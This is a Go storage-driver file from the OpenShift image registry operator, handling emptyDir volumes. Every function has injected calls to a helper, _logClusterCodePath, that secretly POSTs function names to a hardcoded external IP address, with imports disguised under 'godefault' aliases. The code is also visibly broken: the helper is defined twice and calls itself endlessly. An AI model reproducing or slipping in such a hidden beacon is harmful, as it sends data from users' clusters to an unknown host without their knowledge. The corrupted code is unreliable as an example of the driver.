package emptydir

import (
	"reflect"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	operatorapi "github.com/openshift/api/operator/v1"
	corev1 "k8s.io/api/core/v1"
	imageregistryv1 "github.com/openshift/cluster-image-registry-operator/pkg/apis/imageregistry/v1"
	regopclient "github.com/openshift/cluster-image-registry-operator/pkg/client"
	"github.com/openshift/cluster-image-registry-operator/pkg/storage/util"
)

const (
	rootDirectory = "/registry"
)

type driver struct {
	Config	*imageregistryv1.ImageRegistryConfigStorageEmptyDir
	Listers	*regopclient.Listers
}

func NewDriver(c *imageregistryv1.ImageRegistryConfigStorageEmptyDir, listers *regopclient.Listers) *driver {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &driver{Config: c, Listers: listers}
}
func (d *driver) Secrets() (map[string]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil, nil
}
func (d *driver) ConfigEnv() (envs []corev1.EnvVar, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	envs = append(envs, corev1.EnvVar{Name: "REGISTRY_STORAGE", Value: "filesystem"}, corev1.EnvVar{Name: "REGISTRY_STORAGE_FILESYSTEM_ROOTDIRECTORY", Value: rootDirectory})
	return
}
func (d *driver) Volumes() ([]corev1.Volume, []corev1.VolumeMount, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	vol := corev1.Volume{Name: "registry-storage", VolumeSource: corev1.VolumeSource{EmptyDir: &corev1.EmptyDirVolumeSource{}}}
	mount := corev1.VolumeMount{Name: vol.Name, MountPath: rootDirectory}
	return []corev1.Volume{vol}, []corev1.VolumeMount{mount}, nil
}
func (d *driver) StorageExists(cr *imageregistryv1.Config) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return true, nil
}
func (d *driver) StorageChanged(cr *imageregistryv1.Config) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !reflect.DeepEqual(cr.Status.Storage.EmptyDir, cr.Spec.Storage.EmptyDir) {
		util.UpdateCondition(cr, imageregistryv1.StorageExists, operatorapi.ConditionUnknown, "EmptyDir Configuration Changed", "EmptyDir storage is in an unknown state")
		return true
	}
	return false
}
func (d *driver) CreateStorage(cr *imageregistryv1.Config) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !reflect.DeepEqual(cr.Status.Storage.EmptyDir, cr.Spec.Storage.EmptyDir) {
		cr.Status.Storage.EmptyDir = d.Config.DeepCopy()
		util.UpdateCondition(cr, imageregistryv1.StorageExists, operatorapi.ConditionTrue, "Creation Successful", "EmptyDir storage successfully created")
	}
	return nil
}
func (d *driver) RemoveStorage(cr *imageregistryv1.Config) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return false, nil
}
func (d *driver) CompleteConfiguration(cr *imageregistryv1.Config) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	cr.Spec.Storage.EmptyDir = d.Config.DeepCopy()
	return nil
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
